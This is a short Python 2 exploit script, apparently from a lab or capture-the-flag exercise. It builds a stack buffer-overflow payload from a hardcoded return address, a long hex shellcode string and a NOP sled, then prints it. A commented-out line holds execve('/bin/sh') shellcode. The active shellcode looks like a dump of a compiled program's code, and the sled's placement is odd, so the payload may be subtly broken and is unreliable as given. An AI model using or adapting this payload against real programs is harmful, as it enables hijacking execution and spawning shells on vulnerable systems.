eip_addr = "\x8c\xd1\xff\xff" #0xffffd18c
#shellcode ="\x83\xec\x64jhh///sh/bin\x89\xe3h\x01\x01\x01\x01\x814$ri\x01\x011\xc9Qj\x04Y\x01\xe1Q\x89\xe11\xd2j\x0bX\xcd\x80"
shellcode = "\x53\x83\xec\x08\xe8\xc3\x00\x00\x00\x81\xc3\xe3\x1b\x00\x00\x8b\x83\x24\x00\x00\x00\x85\xc0\x74\x05\xe8\x66\x00\x00\x00\x83\xc4\x08\x5b\xc3\xff\xb3\x04\x00\x00\x00\xff\xa3\x08\x00\x00\x00\x00\x00\xff\xa3\x0c\x00\x00\x00\x68\x00\x00\x00\x00\xe9\xe0\xff\xff\xff\xff\xa3\x10\x00\x00\x00\x68\x08\x00\x00\x00\xe9\xd0\xff\xff\xff\xff\xa3\x14\x00\x00\x00\x68\x10\x00\x00\x00\xe9\xc0\xff\xff\xff\xff\xa3\x18\x00\x00\x00\x68\x18\x00\x00\x00\xe9\xb0\xff\xff\xff\xff\xa3\x20\x00\x00\x00\x66\x90\xff\xa3\x24\x00\x00\x00\x66\x90\x31\xed\x5e\x89\xe1\x83\xe4\xf0\x50\x54\x52\xe8\x22\x00\x00\x00\x81\xc3\x50\x1b\x00\x00\x8d\x83\xc0\xe6\xff\xff\x50\x8d\x83\x60\xe6\xff\xff\x50\x51\x56\xff\xb3\x28\x00\x00\x00\xe8\x9f\xff\xff\xff\xf4\x8b\x1c\x24\xc3\x66\x90\x66\x90\x66\x90\x66\x90\x66\x90\x8b\x1c\x24\xc3\x66\x90\x66\x90\x66\x90\x66\x90\x66\x90\x66\x90\xe8\xe4\x00\x00\x00\x81\xc2\x0b\x1b\x00\x00\x8d\x8a\x38\x00\x00\x00\x8d\x82\x38\x00\x00\x00\x39\xc8\x74\x1d\x8b\x82\x1c\x00\x00\x00\x85\xc0\x74\x13\x55\x89\xe5\x83\xec\x14\x51\xff\xd0\x83\xc4\x10\xc9\xc3\x90\x8d\x74\x26\x00\xf3\xc3\x8d\xb6\x00\x00\x00\x00\xe8\xa4\x00\x00\x00\x81\xc2\xcb\x1a\x00\x00\x55\x8d\x8a\x38\x00\x00\x00\x8d\x82\x38\x00\x00\x00\x29\xc8\x89\xe5\x53\xc1\xf8\x02\x89\xc3\x83\xec\x04\xc1\xeb\x1f\x01\xd8\xd1\xf8\x74\x14\x8b\x92\x2c\x00\x00\x00\x85\xd2\x74\x0a\x83\xec\x08\x50\x51\xff\xd2\x83\xc4\x10\x8b\x5d\xfc\xc9\xc3\x89\xf6\x8d\xbc\x27\x00\x00\x00\x55\x89\xe5\x53\xe8\x57\xff\xff\xff\x81\xc3\x77\x1a\x00\x00\x83\xec\x04\x80\xbb\x38\x00\x00\x00\x75\x27\x8b\x83\x20\x00\x00\x00\x85\xc0\x74\x11\x83\xec\x0c\xff\xb3\x34\x00\x00\x00\xe8\xdd\xfe\xff\xff\x83\xc4\x10\xe8\x35\xff\xff\xff\xc6\x83\x38\x00\x00\x00\x8b\x5d\xfc\xc9\xc3\x89\xf6\x8d\xbc\x27\x00\x00\x00\x55\x89\xe5\x5d\xe9\x57\xff\xff\xff\x8b\x14\x24\xc3\x8d\x4c\x24\x04\x83\xe4\xf0\xff\x71\xfc\x55\x89\xe5\x53\x51\x83\xec\x10\xe8\xec\xfe\xff\xff\x81\xc3\x0c\x1a\x00\x00\x65\xa1\x14\x00\x00\x00\x89\x45\xf4\x31\xc0\x8d\x83\x00\xe7\xff\xff\x89\x45\xec\xc7\x45\xf0\x00\x00\x00\x83\xec\x08\x6a\x00\x6a\x00\xe8\x3f\xfe\xff\xff\x83\xc4\x10\x83\xec\x04\x6a\x00\x8d\x45\xec\x50\x8d\x83\x00\xe7\xff\xff\x50\xe8\x47\xfe\xff\xff\x83\xc4\x10\xb8\x00\x00\x00\x00\x8b\x55\xf4\x65\x33\x15\x14\x00\x00\x74\x05\xe8\x7e\x00\x00\x00\x8d\x65\xf8\x59\x5b\x5d\x8d\x61\xfc\xc3\x66\x90\x66\x90\x55\x57\x56\x53\xe8\x77\xfe\xff\xff\x81\xc3\x97\x19\x00\x00\x83\xec\x0c\x8b\x6c\x24\x28\x8d\xb3\x04\xff\xff\xff\xe8\x93\xfd\xff\xff\x8d\x83\x00\xff\xff\xff\x29\xc6\xc1\xfe\x02\x85\xf6\x74\x25\x31\xff\x8d\xb6\x00\x00\x00\x00\x83\xec\x04\x55\xff\x74\x24\x2c\xff\x74\x24\x2c\xff\x94\xbb\x00\xff\xff\x83\xc7\x01\x83\xc4\x10\x39\xfe\x75\xe3\x83\xc4\x0c\x5b\x5e\x5f\x5d\xc3\x8d\x76\x00\xf3\xc3\x66\x90\x66\x90\x66\x90\x66\x90\x66\x90\x66\x90\x66\x90\x53\xe8\x0a\xfe\xff\xff\x81\xc3\x2a\x19\x00\x00\x83\xec\x08\xe8\x6c\xfd\xff\xff\x53\x83\xec\x08\xe8\xf3\xfd\xff\xff\x81\xc3\x13\x19\x00\x00\x83\xc4\x08\x5b\xc3"
nopsled = "\x90"*17
payload = shellcode + nopsled + eip_addr
print payload
